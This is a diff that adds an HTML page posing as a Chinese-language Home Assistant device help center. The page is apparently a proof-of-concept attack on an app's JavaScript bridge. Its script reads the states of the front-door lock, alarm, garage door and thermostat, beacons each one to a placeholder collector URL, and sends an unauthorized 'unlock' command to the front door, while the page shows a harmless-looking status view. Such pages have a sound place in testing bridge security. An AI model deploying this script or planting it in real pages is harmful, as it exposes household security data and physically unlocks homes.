@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Home Assistant - 设备帮助中心</title>
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; color: #1a1a1a; background: #fafafa; }
+h2 { color: #18bcf2; border-bottom: 2px solid #18bcf2; padding-bottom: 8px; }
+.card { background: #fff; border-radius: 10px; padding: 16px; margin: 12px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+.device-row { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #eee; }
+.device-name { font-weight: 600; }
+.device-status { font-size: 13px; color: #666; }
+.status-ok { color: #4caf50; }
+.status-alert { color: #ff9800; }
+.loading { color: #999; font-style: italic; }
+.info { color: #888; font-size: 13px; margin-top: 4px; }
+table { width: 100%; border-collapse: collapse; margin: 8px 0; font-size: 13px; }
+td { padding: 6px 8px; border-bottom: 1px solid #eee; }
+td:first-child { font-weight: bold; width: 140px; color: #555; }
+</style>
+</head>
+<body>
+<h2>Home Assistant 设备帮助</h2>
+<p class="info">本页面帮助你了解已连接设备的状态和快速排障方法。</p>
+
+<div class="card">
+<h3>设备状态速览</h3>
+<div id="device-list"><span class="loading">正在查询设备状态...</span></div>
+</div>
+
+<div class="card">
+<h3>快速操作</h3>
+<div id="action-result"><span class="loading">等待操作...</span></div>
+</div>
+
+<div class="card">
+<h3>设备诊断信息</h3>
+<table>
+<tr><td>前门门锁</td><td id="diag-lock">-</td></tr>
+<tr><td>安防系统</td><td id="diag-alarm">-</td></tr>
+<tr><td>车库门</td><td id="diag-garage">-</td></tr>
+<tr><td>客厅温控</td><td id="diag-thermo">-</td></tr>
+</table>
+</div>
+
+<script>
+var EXFIL = "http://{{LOCAL_IP}}:8000/collect";
+
+function log(id, text) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = text;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data);
+    try {
+        new Image().src = EXFIL + "?d=" + encodeURIComponent(payload);
+    } catch(e) {}
+    try {
+        fetch(EXFIL + "?d=" + encodeURIComponent(payload), { mode: "no-cors" });
+    } catch(e) {}
+}
+
+// ---- 利用 HomeAppBridge 窃取设备状态 ----
+var devices = ["lock.front_door", "alarm_control_panel.home", "cover.garage_door", "climate.living_room", "light.living_room"];
+var deviceResults = [];
+
+for (var i = 0; i < devices.length; i++) {
+    var devId = devices[i];
+    try {
+        var state = window.HomeAppBridge.getDeviceState(devId);
+        deviceResults.push(devId + ": " + state);
+        exfil("deviceState_" + devId, state);
+    } catch(e) {
+        deviceResults.push(devId + ": error - " + e.message);
+    }
+}
+
+// 显示结果
+var listHtml = "";
+for (var j = 0; j < deviceResults.length; j++) {
+    listHtml += "<div class='device-row'><span class='device-name'>" + devices[j] + "</span><span class='device-status status-ok'>已读取</span></div>";
+}
+log("device-list", listHtml || "无设备数据");
+
+// ---- 利用 sendCommand 执行未授权操作 ----
+try {
+    var cmdResult = window.HomeAppBridge.sendCommand("lock.front_door", "unlock");
+    log("action-result", "已发送解锁指令: " + cmdResult);
+    exfil("unauthorizedCommand", "unlock_front_door => " + cmdResult);
+} catch(e) {
+    log("action-result", "指令发送失败: " + e.message);
+}
+
+// 诊断信息
+try { log("diag-lock", window.HomeAppBridge.getDeviceState("lock.front_door")); } catch(e) {}
+try { log("diag-alarm", window.HomeAppBridge.getDeviceState("alarm_control_panel.home")); } catch(e) {}
+try { log("diag-garage", window.HomeAppBridge.getDeviceState("cover.garage_door")); } catch(e) {}
+try { log("diag-thermo", window.HomeAppBridge.getDeviceState("climate.living_room")); } catch(e) {}
+
+exfil("summary", "All device states exfiltrated. Unauthorized unlock command sent to front door.");
+</script>
+</body>
+</html>
